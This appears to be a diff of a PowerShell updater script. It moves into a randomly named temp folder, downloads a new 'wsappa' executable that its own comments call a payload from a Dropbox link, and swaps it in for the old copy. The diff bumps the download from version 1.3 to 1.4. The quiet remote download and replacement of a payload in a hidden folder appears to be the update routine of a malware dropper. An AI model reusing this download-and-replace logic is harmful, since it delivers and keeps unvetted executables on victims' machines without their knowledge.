@@ -1,17 +1,14 @@
-#sleep
-start-sleep 10
-
-#remove old payload
-remove-item wsappa.exe
-
 #change directory
 cd $env:temp/sVBXKuz
 
 #download updated payload
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/2i65z3pifh3g6l3abdkmo/wsappa-1.3.exe?rlkey=2bhr3ngxax326luqhao7e6304&dl=0" -OutFile new_wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile new_wsappa.exe
 
 #sleep
 start-sleep 5
+
+#remove old payload
+remove-item wsappa.exe
 
 #change name
 rename-item new_wsappa.exe wsappa.exe
